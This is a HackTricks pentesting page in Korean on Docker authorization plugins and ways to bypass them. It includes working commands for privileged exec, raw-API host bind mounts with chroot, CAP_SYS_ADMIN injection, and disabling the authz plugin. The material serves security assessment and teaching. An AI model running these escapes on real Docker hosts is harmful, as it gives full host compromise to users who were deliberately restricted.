# Runtime Authorization Plugins

{{#include ../../../banners/hacktricks-training.md}}

## 개요

Runtime authorization plugins는 호출자가 특정 daemon 작업을 수행할 수 있는지 결정하는 추가 policy layer입니다. Docker가 대표적인 예입니다. 기본적으로 Docker daemon과 통신할 수 있는 사용자는 사실상 daemon을 광범위하게 제어할 수 있습니다. Authorization plugins는 인증된 사용자와 요청된 API operation을 검사한 다음, policy에 따라 요청을 허용하거나 거부하여 이러한 모델의 범위를 좁히려고 합니다.

이 주제는 공격자가 이미 Docker API 또는 `docker` group의 사용자에 접근할 수 있는 경우 exploitation model을 변경하므로 별도의 페이지로 다룰 가치가 있습니다. 이러한 환경에서 중요한 질문은 더 이상 "daemon에 접근할 수 있는가?"뿐만 아니라 "daemon이 authorization layer로 차단되어 있는가? 그렇다면 처리되지 않은 endpoint, 취약한 JSON parsing 또는 plugin-management 권한을 통해 해당 layer를 우회할 수 있는가?"입니다.

## 동작

요청이 Docker daemon에 도달하면 authorization subsystem은 요청 context를 하나 이상의 설치된 plugin에 전달할 수 있습니다. Plugin은 인증된 사용자 identity, 요청 세부 정보, 선택된 header, 그리고 content type이 적합한 경우 요청 또는 response body의 일부를 확인합니다. 여러 plugin을 chain으로 연결할 수 있으며, 모든 plugin이 요청을 허용해야만 access가 승인됩니다.

이 모델은 강력해 보이지만, 안전성은 전적으로 policy 작성자가 API를 얼마나 완전히 이해했는지에 달려 있습니다. `docker run --privileged`를 차단하지만 `docker exec`를 무시하거나, 최상위 `Binds`와 같은 대체 JSON key를 놓치거나, plugin administration을 허용하는 plugin은 제한에 대한 잘못된 신뢰감을 만들면서도 직접적인 privilege-escalation 경로를 여전히 열어둘 수 있습니다.

## 일반적인 Plugin 대상

Policy review에서 중요한 영역은 다음과 같습니다:

- container creation endpoint
- `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` 및 namespace-sharing option과 같은 `HostConfig` field
- `docker exec` 동작
- plugin management endpoint
- 의도한 policy model 외부에서 runtime action을 간접적으로 trigger할 수 있는 모든 endpoint

역사적으로 Twistlock의 `authz` plugin과 `authobot`과 같은 단순한 educational plugin은 policy file과 code path를 통해 endpoint-to-action mapping이 실제로 어떻게 구현되는지 쉽게 확인할 수 있게 해주었으므로 이 모델을 학습하기에 유용했습니다. Assessment 작업에서 중요한 교훈은 policy 작성자가 가장 눈에 띄는 CLI command만이 아니라 전체 API surface를 이해해야 한다는 것입니다.

## 악용

첫 번째 목표는 실제로 무엇이 차단되는지 파악하는 것입니다. Daemon이 action을 거부하면 error에 plugin name이 표시되는 경우가 많으며, 이를 통해 사용 중인 control을 식별하는 데 도움이 됩니다:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
더 광범위한 endpoint 프로파일링이 필요하다면 `docker_auth_profiler`와 같은 tools가 유용합니다. 이러한 tools는 plugin이 실제로 허용하는 API route와 JSON structure를 확인하는 반복적인 작업을 자동화합니다.

환경에서 custom plugin을 사용하고 API와 상호작용할 수 있다면, 실제로 필터링되는 object field를 열거합니다:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
이러한 검사가 중요한 이유는 많은 authorization 실패가 concept-specific이 아니라 field-specific이기 때문입니다. Plugin은 동등한 API 구조를 완전히 차단하지 않은 채 CLI pattern을 거부할 수 있습니다.

### 전체 예시: `docker exec`가 Container 생성 후 Privilege를 추가하는 경우

Privileged Container 생성을 차단하지만 Unconfined Container 생성과 `docker exec`를 허용하는 Policy는 여전히 우회될 수 있습니다:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
데몬이 두 번째 단계를 허용하면, 사용자는 정책 작성자가 제한되어 있다고 판단한 컨테이너 내부에서 권한 있는 interactive process를 되찾게 됩니다.

### 전체 예제: Raw API를 통한 Bind Mount

일부 취약한 정책은 하나의 JSON 형태만 검사합니다. root filesystem bind mount가 일관되게 차단되지 않으면, host를 여전히 mount할 수 있습니다:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
동일한 개념은 `HostConfig` 아래에서도 나타날 수 있습니다:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
영향은 호스트 파일 시스템 전체로의 escape입니다. 흥미로운 점은 이 bypass가 kernel bug가 아니라 불완전한 policy coverage에서 비롯된다는 것입니다.

### 전체 예시: 확인되지 않은 Capability Attribute

policy가 capability와 관련된 attribute를 필터링하지 못하면, 공격자는 위험한 capability를 되찾는 컨테이너를 생성할 수 있습니다:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
`CAP_SYS_ADMIN` 또는 이와 유사하게 강력한 capability가 존재하면 [capabilities.md](protections/capabilities.md) 및 [privileged-containers.md](privileged-containers.md)에 설명된 다양한 breakout techniques에 접근할 수 있습니다.

### 전체 예시: Plugin 비활성화

Plugin-management operations가 허용되는 경우, 가장 깔끔한 bypass는 control을 완전히 끄는 것일 수 있습니다:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
이는 control-plane 수준의 policy failure입니다. authorization layer는 존재하지만, 제한하려던 user가 여전히 이를 disable할 permission을 보유하고 있습니다.

## Checks

이 명령어들은 policy layer가 존재하는지, 그리고 해당 layer가 완전한지 아니면 피상적인지를 확인하기 위한 것입니다.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
여기서 흥미로운 점:

- plugin name이 포함된 거부 메시지는 authorization layer의 존재를 확인해 주며, 종종 정확한 구현을 드러냅니다.
- attacker에게 plugin list가 표시되면 disable 또는 reconfigure 작업이 가능한지 알아내기에 충분할 수 있습니다.
- 명확한 CLI action만 차단하고 raw API request는 차단하지 않는 policy는 달리 입증되기 전까지 bypass 가능한 것으로 간주해야 합니다.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 기본적으로 활성화되지 않음 | authorization plugin이 구성되지 않으면 daemon access는 사실상 all-or-nothing입니다 | 불완전한 plugin policy, allowlist 대신 blacklist 사용, plugin management 허용, field-level blind spot |
| Podman | 일반적인 direct equivalent가 아님 | Podman은 일반적으로 Docker-style authz plugin보다 Unix permission, rootless execution 및 API exposure 결정에 더 많이 의존합니다 | rootful Podman API를 광범위하게 노출, 취약한 socket permission |
| containerd / CRI-O | 다른 control model 사용 | 이러한 runtime은 일반적으로 Docker authz plugin보다 socket permission, node trust boundary 및 higher-layer orchestrator control에 의존합니다 | workload에 socket mount, 취약한 node-local trust assumption |
| Kubernetes | Docker authz plugin이 아닌 API-server 및 kubelet layer에서 authn/authz 사용 | Cluster RBAC 및 admission control이 주요 policy layer입니다 | 과도하게 광범위한 RBAC, 취약한 admission policy, kubelet 또는 runtime API를 직접 노출 |
{{#include ../../../banners/hacktricks-training.md}}
